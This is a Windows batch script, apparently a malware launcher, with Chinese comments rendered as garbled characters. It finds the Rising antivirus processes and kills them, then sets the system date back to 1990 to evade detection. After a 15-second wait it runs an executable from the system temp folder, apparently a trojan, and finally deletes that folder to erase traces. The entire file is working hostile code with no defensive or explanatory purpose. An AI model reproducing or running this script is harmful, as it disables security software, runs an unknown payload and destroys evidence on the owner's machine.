::======ɱ����ʹ���Ǽ��ʧЧ============
@ECHO OFF

knlps.exe -l >PID.txt
::�г�PIDֵ


FINDSTR /i "RavMon.exe" PID.txt >>RAV.txt
FINDSTR /i "RavMonD.exe" PID.txt >>RAV.txt
FINDSTR /i "CCenter.exe" PID.txt >>RAV.txt
::�������ǽ����ַ���


FOR /F "eol=; tokens=1 delims= " %%1 in (RAV.txt) do knlps.exe -k %%1

::======�޸�ϵͳʱ��ʹ���ͼ��ʧЧ============
set date=%date%                            ����ǹؼ� �ƿ��Ͳ�ɱ�� ��������û��䱻ɱ��  

date 1990-01-01

date 1990-01-01

::========����ʱ�ȴ�15��======================  
@echo off & setlocal enableextensions
echo WScript.Sleep 1000 > %temp%.\tmp$$$.vbs
set /a i = 15
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %temp%.\tmp$$$.vbs
goto Timeout
goto End

::===========����ʱ�ȴ�����������ľ��=============
:Next
%systemroot%\temp\11.exe

for %%f in (%temp%.\tmp$$$.vbs*) do del %%f

::======�ָ�ʱ��(���ͼ��)=======================
date 2007-10-27	aaa
date %date% 	aaa

::=========����ۼ�============================
RD /S /Q %systemroot%\temp\